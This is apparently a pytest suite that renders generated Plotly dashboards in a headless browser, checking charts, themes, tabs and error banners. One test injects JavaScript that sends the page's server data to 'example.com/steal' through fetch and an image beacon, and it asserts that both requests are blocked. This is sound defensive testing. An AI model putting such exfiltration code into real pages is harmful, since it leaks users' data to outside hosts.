"""Render generated pages in a real headless browser and inspect what actually drew.

Skipped when no Chromium-based browser is installed (set DATAVAULT_TEST_BROWSER to point at one).
Plotly is inlined into these pages, so no network is needed.
"""

from __future__ import annotations

from pathlib import Path

import pytest

import _browser
from conftest import make_context, saved_path, tools_by_name

pytestmark = pytest.mark.skipif(_browser.BROWSER is None, reason="no Chromium-based browser found")

PLOTS = "document.querySelectorAll('.js-plotly-plot').length"
DRAWN = "document.querySelectorAll('.js-plotly-plot .main-svg').length"
TRACES = "Array.from(document.querySelectorAll('.js-plotly-plot')).map(p => p.data.length)"


@pytest.fixture(scope="module")
def ctx(tmp_path_factory):
    return make_context(tmp_path_factory.mktemp("browser"), plotly_js="inline")


def generate(ctx, **args) -> Path:
    out = tools_by_name(ctx)["generate_html_viz"].invoke({"data_ref": "sales", **args})
    assert "saved to" in out, out
    return saved_path(out)


def test_dashboard_charts_actually_draw(ctx):
    spec = {
        "theme": "black",
        "datasets": {
            "m": {"group_by": [{"col": "sale_date", "grain": "month", "as": "month"}, "brand"], "metrics": [{"agg": "sum", "col": "price", "as": "revenue"}]},
            "t": {"group_by": ["brand"], "metrics": [{"agg": "count", "as": "n"}]},
        },
        "body": [
            {"type": "kpis", "items": [{"label": "Brands", "dataset": "t", "field": "n"}]},
            {"type": "grid", "columns": 2, "children": [
                {"type": "chart", "chart": "line", "dataset": "m", "x": "month", "y": "revenue", "color": "brand", "title": "Lines"},
                {"type": "chart", "chart": "donut", "dataset": "t", "x": "brand", "y": "n", "title": "Donut"},
            ]},
            {"type": "tabs", "tabs": [
                {"title": "A", "children": [{"type": "text", "text": "tab a"}]},
                {"title": "B", "children": [{"type": "text", "text": "tab b"}]},
            ]},
        ],
    }
    page = _browser.render(generate(ctx, spec=spec), {
        "plots": PLOTS, "drawn": DRAWN, "traces": TRACES,
        "bg": "getComputedStyle(document.body).backgroundColor",
        "tab_b_hidden_before": "document.getElementById('tabs3-1').hidden",
        "tab_b_hidden_after": "(document.querySelectorAll('.dv-tab')[1].click(), document.getElementById('tabs3-1').hidden)",
    })
    assert page.errors == [], page.errors
    assert page.values["plots"] == 2 and page.values["drawn"] >= 2 * 2, page.values
    assert page.values["traces"] == [4, 1]  # one line per brand; one donut
    assert page.values["bg"] == "rgb(0, 0, 0)"  # the 'black' theme is truly black
    assert page.values["tab_b_hidden_before"] is True and page.values["tab_b_hidden_after"] is False


def test_every_chart_family_draws(ctx):
    kinds = ["bar", "barh", "pie", "donut", "histogram", "box", "violin", "scatter", "area", "treemap", "sunburst", "funnel", "heatmap", "waterfall"]
    raw = ("histogram", "box", "violin", "scatter")
    body = [{
        "type": "chart", "chart": k, "dataset": "raw" if k in raw else "d",
        "x": {"histogram": "price", "scatter": "id", "box": "brand", "violin": "brand"}.get(k, "brand"),
        "y": "price" if k in ("scatter", "box", "violin") else ("vehicle_type" if k == "heatmap" else "value"),
        "z": "value", "path": ["brand", "vehicle_type"],
    } for k in kinds]
    spec = {"datasets": {"d": {"group_by": ["brand", "vehicle_type"], "metrics": [{"agg": "avg", "col": "price", "as": "value"}]},
                         "raw": {"select": ["id", "price", "brand"], "limit": 300}}, "body": body}
    failed = "Array.from(document.querySelectorAll('.dv-plot')).filter(e => !e.classList.contains('js-plotly-plot')).map(e => e.textContent)"
    page = _browser.render(generate(ctx, spec=spec), {"plots": PLOTS, "drawn": DRAWN, "failed": failed}, settle=6)
    assert page.errors == [] and page.values["plots"] == len(kinds), (page.values, page.errors)
    assert page.values["failed"] == [] and page.values["drawn"] >= len(kinds) * 2


def test_native_plotly_figure_with_bindings_draws(ctx):
    spec = {
        "datasets": {"flow": {"group_by": ["brand", "vehicle_type"], "metrics": [{"agg": "count", "as": "n"}]}},
        "body": {"type": "chart", "figure": {"data": [{
            "type": "sankey", "node": {"label": ["Toyota", "Honda", "Ford", "Tesla", "Car", "SUV", "Truck"]},
            "link": {"source": [0, 1, 2, 3], "target": [4, 5, 6, 4], "value": {"$col": "flow.n"}}}]}},
    }
    page = _browser.render(generate(ctx, spec=spec), {"plots": PLOTS, "type": "document.querySelector('.js-plotly-plot').data[0].type"})
    assert page.errors == [] and page.values == {"plots": 1, "type": "sankey"}


def test_custom_js_runs_with_server_data_but_cannot_reach_the_network(ctx):
    spec = {
        "datasets": {"t": {"group_by": ["brand"], "metrics": [{"agg": "count", "as": "n"}]}},
        "js": (
            "document.getElementById('x').textContent = 'rows=' + DATAVAULT.data.t.length;"
            "fetch('https://example.com/steal?d=' + JSON.stringify(DATAVAULT.data))"
            ".then(() => { document.body.dataset.net = 'LEAKED'; }).catch(() => { document.body.dataset.net = 'blocked'; });"
            "var i = new Image(); i.onload = () => { document.body.dataset.img = 'LEAKED'; }; i.onerror = () => { document.body.dataset.img = 'blocked'; };"
            "i.src = 'https://example.com/pixel.png?d=1';"
        ),
        "body": {"type": "html", "html": "<div id='x'></div>"},
    }
    page = _browser.render(generate(ctx, spec=spec), {
        "rows": "document.getElementById('x').textContent", "net": "document.body.dataset.net", "img": "document.body.dataset.img",
    }, settle=3)
    assert page.values == {"rows": "rows=4", "net": "blocked", "img": "blocked"}, page.values


def test_script_errors_are_shown_not_swallowed(ctx):
    page = _browser.render(
        generate(ctx, spec={"datasets": {}, "js": "throw new Error('boom')", "body": {"type": "text", "text": "ok"}}),
        {"banner": "document.querySelector('.dv-error') && document.querySelector('.dv-error').textContent"},
    )
    assert page.values["banner"] == "Script error: boom"


def test_raw_custom_html_with_plotly_latest_renders_with_a_working_plotly(tmp_path):
    """LLMs love plotly-latest, which is frozen at 1.58.5; it is rewritten to the matching version."""
    ctx = make_context(tmp_path)  # CDN mode: this test needs the network
    html = (
        "<html><head><script src='https://cdn.plot.ly/plotly-latest.min.js'></script></head><body><div id='p'></div>"
        "<script>Plotly.newPlot('p', [{type:'bar', x:['a','b'], y:[1,2]}], {title:'raw'});</script></body></html>"
    )
    page = _browser.render(generate(ctx, custom_html=html), {
        "plots": PLOTS, "version": "typeof Plotly !== 'undefined' ? Plotly.version : null",
    }, settle=8)
    if page.values["version"] is None:
        pytest.skip("cdn.plot.ly not reachable from this machine")
    assert page.values["plots"] == 1 and not page.values["version"].startswith("1."), page.values
